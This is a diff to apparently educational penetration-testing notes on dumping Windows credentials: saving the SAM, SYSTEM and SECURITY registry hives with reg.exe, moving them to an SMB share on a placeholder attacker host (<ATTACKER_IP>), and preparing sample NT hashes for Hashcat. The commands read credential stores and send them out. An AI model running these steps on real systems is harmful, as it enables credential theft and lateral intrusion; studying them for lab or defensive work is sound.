@@ -1794,22 +1794,22 @@ There are three registry hives we can copy if we have local administrative acces
 
 1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***
 
-    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save' on the C:\ drive
+    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save'
 
     ```cmd
-    C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+    reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
     ```
 
-    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save' on the C:\ drive
+    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save'
 
     ```cmd
-    C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+    reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
     ```
 
-    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save' on the C:\ drive
+    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save'
 
     ```cmd
-    C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+    reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
     ```
 
     After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.
@@ -1819,21 +1819,22 @@ There are three registry hives we can copy if we have local administrative acces
     **Attack Machine:** Create a share with smbserver
 
     ```bash
-    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <NEW_SHARE_NAME> /home/ltnbob/Documents/
+    mkdir ~/winhives
+    sudo smbserver.py -smb2support share ~/winhives
     ```
 
     **Target Machine:** Transfer the hive copies to the share
 
     ```bash
-    C:\> move sam.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    C:\> move sam.save \\<ATTACKER_IP>\share
     ```
 
     ```bash
-    C:\> move security.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    C:\> move security.save \\<ATTACKER_IP>\share
     ```
 
     ```bash
-    C:\> move system.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    C:\> move system.save \\<ATTACKER_IP>\share
     ```
 
 3. **Dump the hashes with secretsdump**
@@ -1861,13 +1862,11 @@ There are three registry hives we can copy if we have local administrative acces
     **Attack Machine:** Populate a text file with the NT hashes we were able to dump
 
     ```bash
-    nano windowshashes.txt
+    cat windowshashes.txt
 
-    # 64f12cddaa88057e06a81b54e73b949b
-    # 31d6cfe0d16ae931b73c59d7e0c089c0
-    # 6f8c3f4d3869a10f3b4f0522f537fd33
-    # 184ecdda8cf1dd238d438c4aea4d560d
-    # f7eb9c06fafaa23c4bcf22ba6781c1e2
+    31d6cfe0d16ae931b73c59d7e0c089c0
+    c02478537b9727d391bc80011c2e2321
+    58a478135a93ac3bf058a5ea0e8fdb71
     ```
 
     **Attack Machine:** Run Hashcat against NT hashes
